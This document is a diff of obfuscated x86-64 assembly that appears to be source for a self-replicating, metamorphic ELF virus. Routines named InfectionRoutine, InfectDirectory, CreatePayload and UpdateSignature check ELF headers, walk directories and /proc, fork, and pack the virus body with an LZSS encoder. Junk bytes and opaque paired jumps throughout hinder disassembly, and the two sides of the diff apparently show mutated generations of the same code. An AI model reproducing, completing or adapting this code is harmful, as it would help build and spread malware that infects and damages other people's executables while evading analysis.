+..@qjamrc8Zkrya:
+    mov         eax, ebx
+    and         eax, edx
+    test        eax, eax
+    jmp         $+4
+db 0x4c, 0xab
+    jmp         $+3
+db 0x04
+    jb          ..@mm5Zd9VTs5Ei
+    jae         ..@mm5Zd9VTs5Ei
+..@sv2ZjJ5lBsEf:
+    add         eax, 0x30
+    jmp         $+4
+db 0x58, 0xce
+    js          ..@YEBriIJaBMAv
+    jns         ..@YEBriIJaBMAv
+..@CvDTA8oVitCy:
+    call        CreatePayload
+    jmp         ..@VxA138Idaxwn
+..@u3eSpwI3CJEw:
+    mov         rax, (-1)
+    jmp         $+5
+db 0x16, 0xbd, 0xfd
+    js          ..@hgE5w6Fo7uHx
+    jns         ..@hgE5w6Fo7uHx
+..@RSUiE4NS5Pmy:
+    pop         r2
+    js          ..@ZwdwaYIz0mfE
+    jns         ..@ZwdwaYIz0mfE
+..@aAMKP3rZSpfe:
+    cmp         dl, BYTE [rsp+_LZSSE_OFF.match_len]
+    je          ..@mH7aNPn4iE6C
+    jne         ..@mH7aNPn4iE6C
+..@pNPXcdf9P64o:
+    cmp         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
+    je          ..@QgGokKcGlq3I
+    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
+    jmp         ..@Jz7QhAQWXp17
+..@XmSofxDnpzEy:
+    mov         rax, 1
+    jb          ..@cYrHtq0NjT1C
+    jae         ..@cYrHtq0NjT1C
+..@c6cHv83DmXSN:
+    mul         rbx
+    mov         rdi, QWORD [rsp+_DYNPIE_OFF.sh_ptr]
+    add         rdi, rax
+    jmp         ..@OLLN75csFyr5
+..@V3Di2odKj8nx:
+    shr         dx, 0x4
+    jl          ..@vlw8G6ck9nSA
+    jge         ..@vlw8G6ck9nSA
+..@Nq03kCGnStMs:
+%ifdef X86_32
+    xor         ebx, ebx
+%endif
+    jmp         $+5
+db 0x2a, 0x43, 0xda
+    jmp         $+5
+db 0xca, 0xfc, 0xf8
+    jmp         ..@tt5pTdpoMGbi
+..@cy6ygEdy19q9:
+    jmp         ..@611tBUgINy3K
+    js          ..@ViiT1xQWe48y
+    jns         ..@ViiT1xQWe48y
+..@dtIZtBn8QrJe:
+    jmp         ..@R4FxM6IERCtl
+    jmp         $+4
+db 0x07, 0x99
+    jmp         ..@j8XgoH9G9ifr
+..@Grjy3p8I7hHH:
+    sub         ebx, 1
+    cmp         bx, WORD [rsp+_LZSSE_OFF.w_index]
+    jge         ..@YlYAIacUZF2V
+    jmp         $+5
+db 0x7a, 0xe1, 0x99
+    jmp         ..@cj9uaDZq2Jm5
+..@VFOG8hxZ28mK:
+    mov         [r1], rax
+    jmp         $+4
+db 0x37, 0x56
+    jmp         $+3
+db 0x3f
+    jmp         $+4
+db 0xfb, 0x22
+    jmp         $+3
+db 0x1b
+    jb          ..@xdYv9PZaR2UT
+    jae         ..@xdYv9PZaR2UT
+..@MlSzyU5l2RYt:
+    mul         r3
+    add         rax, p_h.p_type
+    jmp         $+4
+db 0x88, 0xbe
+    jmp         ..@FZFrNryPZlU0
+..@XjgcM2fSOTIb:
+    mov         r5, [rsp]
+    mov         QWORD [r5+file.fileptr], rax
+    xor         rax, rax
+    jmp         $+3
+db 0x4b
+    jmp         $+4
+db 0x80, 0xef
+    jmp         ..@cy6ygEdy19q9
+..@XfVfNAWujDt4:
+    cmp         BYTE [r1+4], ELFCLASS
+    jne         ..@rZ7qNVQsHsgv
+    cmp         BYTE [r1+16], ET_EXEC
+    jl          ..@LA5MkaFRvHa5
+    jge         ..@LA5MkaFRvHa5
+..@ARx5EzeSo5IE:
+    xor         rdx, rdx
+    mov         dl, BYTE [rsp+_LZSSE_OFF.cmp_len]
+    sub         dl, cl
+    jmp         $+5
+db 0xc2, 0x00, 0xeb
+    je          ..@aAMKP3rZSpfe
+    jne         ..@aAMKP3rZSpfe
+..@eCQ38dTL726y:
+    mov         rsi, QWORD [rsp+_LZSSE_OFF.inputaddr]
+    rep         movsb
+    jmp         $+5
+db 0x18, 0x2b, 0xd5
+    js          ..@oyoqPVLAw2uN
+    jns         ..@oyoqPVLAw2uN
+..@j8XgoH9G9ifr:
+    mov         r1, QWORD [r5+file.fileptr]
+    cmp         DWORD [r1], 0x464c457f
+    jl          ..@jK29AMnrSIXE
+    jge         ..@jK29AMnrSIXE
+..@K20YvJKbMacp:
+    mov         rax, SYS_FORK
+    syscall
+    test        eax, eax
+    jmp         $+3
+db 0x75
+    jl          ..@Eix5o9R89Rf4
+    jge         ..@Eix5o9R89Rf4
+..@YGvCtyV1laIX:
+    mov         eax, 1
+    jmp         $+4
+db 0xf5, 0x37
+    jl          ..@cMKaxZ4Unzef
+    jge         ..@cMKaxZ4Unzef
+..@R0B4ee3rnLLU:
+    pop         r4
+    jmp         $+3
+db 0xaa
+    jmp         ..@mxYCnRyWJlpy
+..@afH8Ql8R9yLw:
+    push        r2
+    jmp         $+5
+db 0x9b, 0x9b, 0x36
+    jmp         ..@z03l69SjKtJw
+..@OGPspkwQyrEx:
+    mov         QWORD [r5+file.filesize], 0x00
+    jmp         ..@g4prVM2GFzA4
+..@DgIEvZAlCfmP:
+    sub         rsp, _PAYLOAD_OFF_size
+    jmp         ..@8OuO0U9gKJAi
+..@Qvl4OciLIY97:
+    cld
+    jmp         ..@FBKWjRb6Qqsm
+    jmp         $+4
+db 0x84, 0x2c
+    js          ..@PyEoMv10Zn0q
+    jns         ..@PyEoMv10Zn0q
+..@yqyjeOpCzBp9:
+    lea         rdi, [rsp+_LZSSE_OFF.buffer]
     jmp         $+3
 db 0x3f
     jmp         $+3
-db 0x40
-    jmp         $+5
-db 0x08, 0x9f, 0xb5
-    jmp         ..@zeIYTHDhyfcJ
-..@TLQksCwlsS6m:
-    push        r4
-    push        r5
-    xor         r4, r4
-    jb          ..@AfEKvYci0mWA
-    jae         ..@AfEKvYci0mWA
-..@izs06Jzt6tgb:
-    mov         r2, [rsp+_PROC_OFF.dirname]
-    jmp         $+5
-db 0x00, 0x55, 0xea
-    jmp         $+4
-db 0xa7, 0xf2
-    jmp         $+4
-db 0xae, 0x9d
-    jmp         ..@tdRzVJRMCVmT
-..@J565iULZN8EH:
-    mov         DWORD [rdi], esi
-    add         rdi, 0x4
-    mov         rsi, QWORD [rsp+_PAYLOAD_OFF.entry]
-    js          ..@WEinlt0eDrNJ
-    jns         ..@WEinlt0eDrNJ
-..@0ROco8XYMcgp:
-    shl         ebx, LENGTH_BITS
-    jmp         $+5
-db 0x96, 0xb3, 0x29
-    jl          ..@1vKfTaWOkNzl
-    jge         ..@1vKfTaWOkNzl
-..@eu4jYhkSlYhi:
-    add         r1, 1
-    jmp         $+3
-db 0x8c
-    jmp         ..@C9BjFJJF4PTQ
-..@GBEKURlDXUiW:
-    cmp         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH*2-LOOKAHEAD_LENGTH
-    jl          ..@ybxGIdtMjje3
-    jmp         ..@xm5M6TpNyPKr
-..@ZrddbvLlbrJd:
-    pop         r4
-    ret
-    jmp         $+3
-db 0x66
-    jb          MapFile
-    jae         MapFile
-..@Mahqey4gWF2P:
-    inc         WORD m5
-    jmp         $+4
-db 0xc6, 0x4b
-    jmp         ..@ju1XxPHbn5gb
-..@bq74V5EXyLYn:
-    sub         rsp, _UPDATASIG_OFF_size
-    jmp         $+4
-db 0x5e, 0xd6
-    jmp         $+5
-db 0x6f, 0xaf, 0x4d
-    jmp         ..@0wsSG15UStSf
-..@QMwawIlEQSZE:
-    je          ..@pKysl2wLF12v
-    mov         r2d, DWORD [r1]
-    jmp         $+4
-db 0x89, 0x6f
-    jmp         $+5
-db 0x20, 0xfe, 0xaf
-    jl          ..@dBBk0JSlKssF
-    jge         ..@dBBk0JSlKssF
-InfectionRoutine:
-    jmp         ..@kXAAJ7PiPK4t
-GetNewProgramVaddr:
-    jmp         ..@GgSvNHpQARbw
-..@pND99SDFJXmC:
-    pop         r1
-    ret
-    jmp         $+4
-db 0xb5, 0x77
-    jmp         $+4
-db 0xc6, 0x02
-    jl          AddSizeMappedFile
-    jge         AddSizeMappedFile
-..@G4qcRNb4gMHk:
-    jmp         ..@mV1A4zx0WmbP
-    jl          ..@W8IRcwkOikd0
-    jge         ..@W8IRcwkOikd0
-..@Shgl9WRGRWLi:
-    lea         r1, QWORD [rsp+_INFFILE_OFF.file]
-    call        FileValidation
-    cmp         rax, 0x02
-    js          ..@9K4QEOzg5fPE
-    jns         ..@9K4QEOzg5fPE
-..@CBw5mMcFQ45P:
-    xor         rax, rax
-    je          ..@qUYc19sDKmG6
-    jne         ..@qUYc19sDKmG6
-..@S7YSLf3qmVKz:
-    xor         r2, r2
-    je          ..@qGAOaolWu1d0
-    jne         ..@qGAOaolWu1d0
-..@Zcgs1e5yGNUj:
-    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], 0
-    mov         QWORD [rsp+_VADDR_OFF._vaddr], 0
-    xor         rax, rax
-    jmp         $+4
-db 0x14, 0x49
-    jmp         $+3
-db 0xd5
-    jmp         ..@fiObNyuIObLA
-..@Nrs5Qzzzgwlb:
-    test        r2, r2
-    jmp         $+3
-db 0xeb
-    jmp         $+3
-db 0x71
-    jmp         ..@HqGJRUxtbm9g
-..@Rkr4BI3bEH27:
-    cmp         cl, 0x4
-    jl          ..@BdI5QirtH7bP
-    pop         rax
-    jmp         $+4
-db 0x88, 0x47
-    js          ..@B14Z6pbv97PY
-    jns         ..@B14Z6pbv97PY
-..@qidIwvHquVqk:
-    push        rax
-    jmp         $+5
-db 0x21, 0x06, 0x30
-    jl          ..@6LbVzp1rGMXw
-    jge         ..@6LbVzp1rGMXw
-CreatePayload:
-    jmp         ..@e2DGFcKl8L3U
-..@1pTBN4XL8vj0:
-    mov         rax, QWORD [rsp+_LZSSE_OFF.outputaddr]
-    jl          ..@Jpw4BwKAjlK7
-    jge         ..@Jpw4BwKAjlK7
-..@O14yMr9qd0CV:
-    xor         rax, rax
-    jmp         $+4
-db 0x13, 0x9b
-    jmp         $+3
-db 0x37
-    je          ..@t1n9mnxBm196
-    jne         ..@t1n9mnxBm196
-..@lD6mTKIgqZmi:
-    push        r1
-    jmp         ..@hT0uUjCo1VYv
-..@bmmhigOFW7no:
-    jle         ..@euuEa0fW43Iv
-    jmp         $+5
-db 0x28, 0x30, 0x8c
-    jmp         $+3
-db 0x86
-    je          ..@8PHG4FxEohdQ
-    jne         ..@8PHG4FxEohdQ
-..@sDVZbIHxTyI4:
-    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
-    sub         ax, WORD [rsp+_LZSSE_OFF.la_index]
-    jmp         ..@320Wzi4DABiz
-..@WThGw0GlGQ9o:
-    call        UpdateSignature
-    jmp         ..@CuK4tx2PNLIv
-..@vu5VhrPUjB4B:
-    cmp         rax, 0x00
-    jle         ..@DcDtRgOg12Rm
-    mov         QWORD [rsp+_INFDIR_OFF.dirnread], rax
-    jmp         $+5
-db 0x7e, 0x8d, 0xde
-    jb          ..@ARxET5gNCPva
-    jae         ..@ARxET5gNCPva
-..@C0z6esBUdcb6:
-    std
-    jmp         $+5
-db 0xcd, 0xe6, 0xf6
-    js          ..@UF9cGT9nbHh5
-    jns         ..@UF9cGT9nbHh5
-..@c09bVhX75nB0:
-    syscall
-    xor         r1, r1
-    CFILE       DWORD [r5+file.filefd]
-    jmp         ..@98ehD3ialNm2
-..@RWWF6JqWbrHn:
-    jmp         ..@rHSU8kEqdzop
-    jmp         $+4
-db 0x65, 0xa8
-    jb          ..@BwHnreKiyFUD
-    jae         ..@BwHnreKiyFUD
-..@vBLtEMuL1tY6:
-    cmp         DWORD [rdi+s_h.sh_type], SHT_DYNAMIC
-    jmp         $+3
-db 0x62
-    jmp         $+3
-db 0x35
-    jmp         $+5
-db 0xf2, 0xce, 0x58
-    js          ..@Kp01QP34HkWN
-    jns         ..@Kp01QP34HkWN
-..@PaPGV0N0tEd7:
-%ifdef X86_32
-    pop         ebp
-%endif
-    js          ..@7lt5UwcyllIx
-    jns         ..@7lt5UwcyllIx
-..@wc2pgiar9hWd:
-    xor         rdi, rdi
-    xor         rcx, rcx
-    mov         ecx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
-    je          ..@VU40S43gw272
-    jne         ..@VU40S43gw272
-..@ntBUmUnU5nBV:
-    jl          ..@kwK632gyAST4
-    mov         rax, 1
-    jmp         ..@3FP61YZXVpfB
-    jmp         $+3
-db 0x5a
-    jmp         ..@YwG9ihM9qb21
-..@GTn0D750zTwj:
-    push        r5
-    jl          ..@bq74V5EXyLYn
-    jge         ..@bq74V5EXyLYn
-..@oVCx4er5rGCq:
-    pop         r4
-    pop         r5
-    ret
-    jmp         IsELFComplete
-..@Q6RTDmwSsTNS:
-    ret
-    jmp         $+3
-db 0xab
-    jmp         $+5
-db 0x69, 0x39, 0xce
-    jmp         LzssEncoder
-..@T4Tp1S4qMh9V:
-    cmp         rax, 0xffffffffffffffff
-    je          ..@CBw5mMcFQ45P
-    mov         r5, [rsp]
-    jmp         $+5
-db 0x72, 0xc3, 0x15
-    jmp         ..@ivKP0DeHmZcF
-..@hvkFPDOlHn3w:
-    cmp         al, 0xa
-    jmp         $+3
-db 0x1c
-    jmp         $+3
-db 0xf9
-    jb          ..@rZoXNkbqVYdP
-    jae         ..@rZoXNkbqVYdP
-..@bqOfxcL8j1z6:
-    rep         cmpsb
-    jl          ..@Pe5JlxJEsV3g
-    jge         ..@Pe5JlxJEsV3g
-..@e1mBqM7l1j93:
-    mov         eax, SYS_MREMAP
-    syscall
-    cmp         rax, 0xffffffffffffffff
-    jmp         ..@8vlF52B1qVei
-..@qTq4VrNYuLYS:
-    je          ..@Tz071gMscT7I
-    jmp         ..@TSkbAGau9jDj
-..@98ehD3ialNm2:
-    mov         DWORD [r5+file.filefd], 0x00
-    jb          ..@phwibm5BkCnE
-    jae         ..@phwibm5BkCnE
-..@siWE1kcdeWrC:
-    call        UnmapFile
-    jmp         $+3
-db 0x7b
-    js          ..@UUiYVyRZYi4c
-    jns         ..@UUiYVyRZYi4c
-..@G7ZvakXNwHiu:
-    mov         eax, SYS_MUNMAP
-    js          ..@WQM4lYyCb6kF
-    jns         ..@WQM4lYyCb6kF
-..@UdFBplhdGWJS:
-    ret
-    jmp         $+3
-db 0xf6
-    jmp         $+5
-db 0x94, 0xd3, 0x79
-    jb          DestroyPayload
-    jae         DestroyPayload
-..@aINLPXnbONsS:
-    je          ..@AhYZ2QbGV74B
-    cmp         rdi, rsi
-    jbe         ..@D5Wqi7wAM3ma
-    jmp         ..@1fJNuZBTwev7
-..@NXJ5uKe8qjlE:
-    sub         rsp, _NBF_OFF_size
-    jmp         $+3
-db 0x3c
-    jmp         ..@BLtOfbe28x60
-..@ZpbUa3hFwlwU:
-    call        Strcpy
-    mov         BYTE [r1], 0x00
-    lea         r1, [rsp+_INFDIR_OFF.buffer]
-    jmp         $+3
-db 0x5e
-    jl          ..@RhwAFbsQk17z
-    jge         ..@RhwAFbsQk17z
-..@0nAN7EFrqDC3:
-    VAR         packed, pwd_var
-    mov         r1, r5
-    jmp         $+4
-db 0xa1, 0xb9
-    js          ..@tzF2sdVqQfEW
-    jns         ..@tzF2sdVqQfEW
-..@0Fr7A6CYEBO0:
-    jmp         ..@uQqs81K0AI4f
-    jmp         $+3
-db 0x05
-    jl          ..@9TuPDvn8qdiK
-    jge         ..@9TuPDvn8qdiK
-MapFile:
-    jmp         ..@NtXOQAZx1CZd
-..@5SYyXYGKcEx3:
-    mov         r1, QWORD [rsp+_INFFILE_OFF.file+file.fileptr]
-    jb          ..@sFoTWZufsLXw
-    jae         ..@sFoTWZufsLXw
-..@ARxET5gNCPva:
-    mov         QWORD [rsp+_INFDIR_OFF.dirindex], 0x00
-    jmp         ..@58ZAdBsY5v3m
-..@6LbVzp1rGMXw:
-    VAR         packed, dirs_root
-    jb          ..@mDCfi2PnMyIL
-    jae         ..@mDCfi2PnMyIL
-..@9P1WbWKHQH3G:
-    jge         ..@pKysl2wLF12v
-    je          ..@AyUN2hpX3hVJ
-    jne         ..@AyUN2hpX3hVJ
-..@DvWom2mYU3HG:
-    xor         r2, r2
-    lea         r1, [rsp+_INFFILE_OFF.file]
-    mov         r2, m5
-    jmp         $+3
-db 0x72
-    jb          ..@eOq5pUp2PLq9
-    jae         ..@eOq5pUp2PLq9
-..@on0FKbBGuL5Z:
-    jnz         ..@6iHaSqzKkkPE
-    jmp         $+3
-db 0x0e
-    jmp         $+4
-db 0x53, 0xe0
-    jmp         ..@G4qcRNb4gMHk
-..@lwMXdA0hp9F9:
-    xor         rdx, rdx
-    js          ..@lXKoBI0jGRVx
-    jns         ..@lXKoBI0jGRVx
-..@QghO61EqL9cB:
-    lea         rdi, [rsp+_LZSSE_OFF.buffer]
-    jmp         ..@6oFBFbm5iZQH
-..@p37old7mfoaj:
-    sub         r4, m6
-    jmp         ..@qhKKPmCa51RR
-..@MMNkTspjPy41:
-    jne         ..@FLCq9KmgNSsB
-    cmp         BYTE [r1+16], ET_EXEC
-    jmp         $+3
-db 0xf7
-    jl          ..@8Ab4behoWTyP
-    jge         ..@8Ab4behoWTyP
-..@spOGFvUt5fd3:
-    lea         r1, [rsp+_INFDIR_OFF.buffer]
-    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
-    call        Strcpy
-    jb          ..@0n6ENAODxlSD
-    jae         ..@0n6ENAODxlSD
-..@fiObNyuIObLA:
-    mov         r3, [r1+e_h.e_phoff]
-    lea         r4, [r1]
-    add         r4, r3
-    jmp         $+5
-db 0xc8, 0x90, 0x89
-    js          ..@uLWScifCIJ4J
-    jns         ..@uLWScifCIJ4J
-..@6GxFbQQGqUyA:
-    mov         BYTE [r1], 0x00
-    jmp         $+3
-db 0xdc
-    jmp         ..@EKKc3SU51hI1
-..@85t7Hrssn8AR:
-%ifdef X86_32
-    mov         edi, r1
-%endif
-    jmp         ..@CtcG4ensOHGo
-..@EFJXOtiSfves:
-    sub         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH
-    sub         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH
-    sub         WORD [rsp+_LZSSE_OFF.w_index], WINDOW_LENGTH
-    jmp         $+3
-db 0xff
-    jb          ..@UOxCvMUvgG9u
-    jae         ..@UOxCvMUvgG9u
-..@gUlQEPT1UqNB:
-    cmp         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
-    je          ..@1pTBN4XL8vj0
-    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
-    jmp         $+3
-db 0xfd
-    jmp         ..@GR4PWfpDAadO
-..@d4Eova5OMbXN:
-    mov         eax, 0x00
-    js          ..@iQftN2lmjBWW
-    jns         ..@iQftN2lmjBWW
-..@yoTdlj9hLBV1:
-    rep         stosb
-    jb          ..@s5r1kNfFqhEI
-    jae         ..@s5r1kNfFqhEI
-..@RmwQj83G1alH:
-    push        r3
-    jmp         $+3
-db 0x3e
-    jmp         $+3
-db 0x69
-    js          ..@h5kKeLFLspuS
-    jns         ..@h5kKeLFLspuS
-..@lXKoBI0jGRVx:
-    mov         bl, BYTE [rsp+_LZSSE_OFF.character]
-    js          ..@8JW2Wf1IaLnB
-    jns         ..@8JW2Wf1IaLnB
-..@5dFqxetLkZ7u:
-    jnz         ..@lsrxRNxO1dmY
-    jl          ..@bjzmvM4h4dFg
-    jge         ..@bjzmvM4h4dFg
-..@yPMZPERcrcUG:
-    add         rsp, _INFDIR_OFF_size
-    jl          ..@rn7kPe4N1PuQ
-    jge         ..@rn7kPe4N1PuQ
-..@V3sEezbuAyAb:
-    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
-    js          ..@cFzLQnUX2T44
-    jns         ..@cFzLQnUX2T44
-..@qrOmCuZBqPd6:
-    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
-    jl          ..@QjZtc1YaXCYW
-    jge         ..@QjZtc1YaXCYW
-..@1Tye1sI1G11J:
-    VAR         packed, procs
-    jmp         $+5
-db 0x4c, 0x45, 0x47
-    jmp         ..@3302X8uI8jY1
-..@BwHnreKiyFUD:
-    CFILE       DWORD [rsp+_PROC_OFF.dirfd]
-    jmp         $+3
-db 0xd8
-    js          ..@BDEk2VWBSnzH
-    jns         ..@BDEk2VWBSnzH
-..@Sya94H1xCtd9:
-    mov         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH*2
-    mov         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
-    jmp         ..@LMDl7KmZGNiK
-..@3302X8uI8jY1:
-    mov         r1, r5
-    add         r1, r4
-    cmp         BYTE [r1], 0x00
-    jmp         $+3
-db 0x67
-    jl          ..@qTq4VrNYuLYS
-    jge         ..@qTq4VrNYuLYS
-..@NtXOQAZx1CZd:
-    push        r1
-    mov         r2, QWORD [r1+file.filename]
-    OFILE       QWORD [r2], 0x02
-    jmp         $+5
-db 0x04, 0xee, 0xad
-    js          ..@6sMhifIxZAia
-    jns         ..@6sMhifIxZAia
-..@nRtImfModyJv:
-    ret
-    jmp         $+4
-db 0x4c, 0x39
-    jmp         $+3
-db 0x85
-    jb          InfectDirectory
-    jae         InfectDirectory
-..@Hdj4TJLX1Eyl:
-    push        r4
-    jb          ..@awGIg6lC4D2W
-    jae         ..@awGIg6lC4D2W
-..@SWqGghrXh8js:
-    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer+WINDOW_LENGTH-LOOKAHEAD_LENGTH]
-    mov         rsi, QWORD [rsp+_LZSSE_OFF.inputaddr]
-    jmp         $+5
-db 0x18, 0x36, 0x32
-    jl          ..@tuuixxHLb5Zy
-    jge         ..@tuuixxHLb5Zy
-..@Q38adMME29NV:
-    mov         r2, original_virus_len+PADDING
-    js          ..@G7ZvakXNwHiu
-    jns         ..@G7ZvakXNwHiu
-..@3gXhU5QImkdC:
-    mov         QWORD [r2+p_h.p_memsz], r4
-    jmp         $+4
-db 0x2f, 0x3c
-    jb          ..@UpkXpCzeawFY
-    jae         ..@UpkXpCzeawFY
-..@KlGqrzMXt6gm:
-    mov         QWORD [rsp+_LZSSE_OFF.length], r2
-    jmp         ..@BT7fUpyTVz04
-..@ffL7a9gg9ukD:
-%ifdef X86_64
-    mov         rsi, QWORD [r8+file.filesize]
-    mov         edx, 11b
-%endif
-    jmp         $+5
-db 0x03, 0x85, 0x5c
-    jmp         $+3
-db 0xb6
-    jmp         $+5
-db 0x46, 0xe9, 0xbf
-    jl          ..@DF2lhsewMw1E
-    jge         ..@DF2lhsewMw1E
-..@TYCrqD8y9aLB:
-    je          ..@pKysl2wLF12v
-    jmp         ..@HAiLpDez9q8i
-..@x0UQY5pbnCeo:
-    jmp         ..@2U7pgjbVf5pd
-    jmp         $+5
-db 0x92, 0x4b, 0xdb
-    jmp         ..@owTMzOGEfuik
-..@O4RJh4Yshov6:
-    mov         ax, dx
-    jmp         $+4
-db 0x1a, 0xc1
-    jmp         $+3
-db 0x56
-    js          ..@VnxmuW91zIFI
-    jns         ..@VnxmuW91zIFI
-..@lHA1dfwVsdfi:
-    VAR         packed, dirs_tmp
-    jmp         ..@OX1iWJ3FaBHB
-..@T9Jjw6rKg5WH:
-    xor         rax, rax
-    jmp         $+5
-db 0x55, 0xa1, 0x55
-    jb          ..@usm1spK8ILz6
-    jae         ..@usm1spK8ILz6
-..@WnsLu5TfbnRm:
-    or          bx, dx
-    jmp         $+5
-db 0x7b, 0xb2, 0x78
-    js          ..@5RVJqyGzHlzo
-    jns         ..@5RVJqyGzHlzo
-..@HbL75KFJcaug:
-    cmp         eax, 0x3
-    jle         ..@ILFuuzyNwwVx
-    jmp         $+5
-db 0x17, 0x20, 0x8b
-    jmp         $+3
-db 0x58
-    jmp         ..@2Ol2331izW8t
-..@YwG9ihM9qb21:
-    xor         rax, rax
-    jl          ..@3FP61YZXVpfB
-    jge         ..@3FP61YZXVpfB
-..@yQFgUEq9ePlx:
-    sub         al, 0x02
-    jmp         $+4
-db 0x3f, 0xd4
-    js          ..@mE78TPGUdYIr
-    jns         ..@mE78TPGUdYIr
-..@3uVNz1ir4sHk:
-    xor         rax, rax
-    jmp         $+5
-db 0x10, 0xaa, 0x8d
-    je          ..@DcfaDhhGaAcZ
-    jne         ..@DcfaDhhGaAcZ
-..@4BKr9WgzzW1S:
-    call_vsp    Strlen
-    jmp         $+3
-db 0xaa
-    jmp         ..@NNyIiXiAxQl7
-..@Kv12tsZ0hliT:
-    mov         r2, r4
-    jmp         ..@Bw88Vf6yt72I
-..@Qz79efy2Pb28:
-    xor         r4, r4
-    jl          ..@3uVNz1ir4sHk
-    jge         ..@3uVNz1ir4sHk
-..@IlgxZhqGE2pH:
-    jl          ..@vjEEbCmDhFFh
-    cmp         BYTE [r1], 0x39
-    jmp         ..@8MdioTqVJuxY
-..@Gw3M2VJhuWlh:
-    mov         eax, SYS_LSEEK
+db 0x18
+    jmp         ..@asYunRcCUT72
+..@xUDVpy35guCE:
     syscall
     cmp         eax, 0x0
-    je          ..@Ge1AIxLE6vKl
-    jne         ..@Ge1AIxLE6vKl
-..@e2DGFcKl8L3U:
-    sub         rsp, _PAYLOAD_OFF_size
-    mov         QWORD [rsp+_PAYLOAD_OFF.entry], r1
-    mov         WORD [rsp+_PAYLOAD_OFF.index], r2w
+    jle         ..@ViiT1xQWe48y
+    jmp         $+5
+db 0xde, 0x6e, 0xf0
+    je          ..@3IdYQ2ZFvaX2
+    jne         ..@3IdYQ2ZFvaX2
+..@MI8cq6CMWXUz:
+    mov         r3, original_virus_len-non_packed_len
+    call        MemMove
+    xor         r2, r2
     jmp         $+3
-db 0xed
-    jmp         ..@Z5dGYnofpNCy
-..@bH15DR3j5wXW:
-    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
-    add         rdi, _signature.index-_signature.start
-    mov         DWORD [rdi], eax
-    jb          ..@bBmaJM5Nnte9
-    jae         ..@bBmaJM5Nnte9
-..@D8irPPg1u7r2:
-    mov         rsi, rdi
-    add         rdi, rbx
-    mov         dx, WORD [rsp+_LZSSE_OFF.la_index]
-    jmp         $+3
-db 0xac
-    jl          ..@VvEpqiQ5nlEH
-    jge         ..@VvEpqiQ5nlEH
-..@6iHaSqzKkkPE:
-    shr         edx, 1
-    test        edx, edx
-    jnz         ..@jVgWGHmGg8sU
-    jmp         ..@cwFp3z8AfOk8
-..@xLBrgvzHONZy:
-    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
-    jl          ..@cInF6ArauVeL
-    jge         ..@cInF6ArauVeL
-..@eY1K1M5PBGMx:
-    cmp         rax, (-1)
-    jmp         ..@BHeBF6UoTDla
-..@CuK4tx2PNLIv:
-    mov         r1, QWORD [r5+file.fileptr]
-    add         r1, signature_len-1
-    jmp         $+4
-db 0xe5, 0x52
-    jmp         ..@lctHSL9ymoFj
-..@O9zsmz7vGk1Q:
-    mov         rax, SYS_WAIT4
-    jmp         ..@xwpcULTOrJZO
-..@BT7fUpyTVz04:
-    xor         rax, rax
-    jmp         $+3
-db 0x5b
-    je          ..@wc2pgiar9hWd
-    jne         ..@wc2pgiar9hWd
-..@ioyWjQ5mcaae:
-    sub         r2, 1
-    jmp         ..@XYOxvfOeSK8B
-..@eOq5pUp2PLq9:
-    call        NonBinaryFile
-    jmp         $+3
-db 0xad
-    jmp         $+4
-db 0xea, 0x43
-    jmp         ..@Mahqey4gWF2P
-..@WQM4lYyCb6kF:
+db 0x36
+    jb          ..@OOrEl0Nry7A7
+    jae         ..@OOrEl0Nry7A7
+..@8tm2tgPSpYNf:
+    mov         WORD [rsp+_LZSSE_OFF.w_index], 0x0000
+    jmp         $+5
+db 0x36, 0xaa, 0xfa
+    je          ..@558pDbgxYslW
+    jne         ..@558pDbgxYslW
+..@S3GuQyFfevZm:
+    mov         r2, QWORD [r5+file.fileptr]
+    jmp         ..@dhmtsbVaoyYs
+..@E5hVQgUHALoU:
+    add         rsp, _PROC_OFF_size
+    jmp         $+5
+db 0x3c, 0x50, 0x17
+    jmp         InfectionRoutine
+..@tE5ZdIYc6T3a:
+    xor         rcx, rcx
+    jmp         ..@zAiDqZUNyCK2
+..@Q0XURZ3PjlcY:
+    sub         al, 0x02
+    mov         edx, 1
+    je          ..@K5vGHDI1fL2f
+    jne         ..@K5vGHDI1fL2f
+..@mm5Zd9VTs5Ei:
+    jnz         ..@eDvIPiZixItI
+    jmp         ..@fKHPCDyP6f2n
+..@eRWtE3wBUbL4:
+    mov         rax, SYS_MUNMAP
     syscall
-    jmp         $+4
-db 0x80, 0xdb
-    jmp         ..@Q6RTDmwSsTNS
-..@TRGNpw2karFK:
-    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], r1
-    mov         QWORD [rsp+_LZSSE_OFF.outputaddr], r3
-    mov         QWORD [rsp+_LZSSE_OFF.saveoutptr], r3
-    jmp         $+4
-db 0x51, 0x5e
-    jl          ..@ivkBt6mNW3iJ
-    jge         ..@ivkBt6mNW3iJ
-..@EARyXOhFtNjA:
-    test        eax, eax
-    jnz         ..@W8IRcwkOikd0
-    jmp         $+4
-db 0xe3, 0xdc
-    jmp         ..@cTQIcHlqeoPc
-..@Jj82UGXYo1aK:
-    call        LzssEncoder
-    jmp         ..@bvXh0QBcplpk
-..@5Zm5I8fLrIP2:
-    push        r1
-    mov         r5, QWORD [r1+file.fileptr]
-    mov         r1, QWORD [r5+e_h.e_shoff]
-    jmp         $+3
-db 0xe8
-    jmp         ..@xg086vKBic5j
-..@LJRX9uDEVLn3:
     xor         r1, r1
     jmp         $+4
-db 0x06, 0xf5
-    jb          ..@p36lNEUiWvGf
-    jae         ..@p36lNEUiWvGf
-..@g5nPp5NufSKl:
-%ifdef X86_64
-    mov         r8, 0xffffffffffffffff
